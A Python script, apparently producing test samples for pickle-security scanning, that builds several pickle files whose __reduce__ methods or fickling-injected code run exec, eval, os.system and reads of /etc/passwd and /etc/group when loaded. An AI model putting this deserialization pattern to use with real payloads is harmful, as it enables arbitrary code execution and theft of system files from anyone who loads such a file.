import builtins
import os
import pickle
import socket
from fickling.pickle import Pickled

class ExecuteCode(object):
    def __reduce__(self):
        return (builtins.exec, ("import os; os.system('echo I am executing arbitrary code!')",))
class EvalCode(object):
    def __reduce__(self):
        return (eval, ("['a', 'b', 'c']",))
class CompileCode(object):
    def __reduce__(self):
        return (compile, ("print('Hello, world!')", "<string>", "exec"),)
class OpenFile(object):
    def __reduce__(self):
        return (builtins.exec, ("f = open('/etc/passwd', 'r'); print(f.read()); f.close()",))

class MalSocket(object):
    def __reduce__(self):
        return socket.socket, (socket.AF_INET, socket.SOCK_STREAM)


with open('malicious_socket.pkl', 'wb') as f:
    pickle.dump(MalSocket(), f)

my_list = ['a', 'b', 'c']
with open('malicious_exec.pkl', 'wb') as f:
    pickle.dump((ExecuteCode(), my_list), f)

with open('malicious_eval.pkl', 'wb') as f:
    pickle.dump(EvalCode(), f)

with open('malicious_compile.pkl', 'wb') as f:
    pickle.dump(CompileCode(), f)

with open('malicious_open.pkl', 'wb') as f:
    pickle.dump(OpenFile(), f)

# Create a malicious pickle
student_names = ['Alice','Bob','Elena','Jane','Kyle']
pickle_bin = pickle.dumps(student_names)
p = Pickled.load(pickle_bin)
p.insert_python_exec("with open('/etc/passwd','r') as r: print(r.readlines())")
p.insert_python_exec("with open('/etc/group','r') as r: print(r.readlines())")
p.insert_python_exec("import module print('malicious')")
p.insert_python_exec("import os  os.system('echo Malicious code!')")

with open('unsafe.pkl', 'wb') as f:
    p.dump(f)

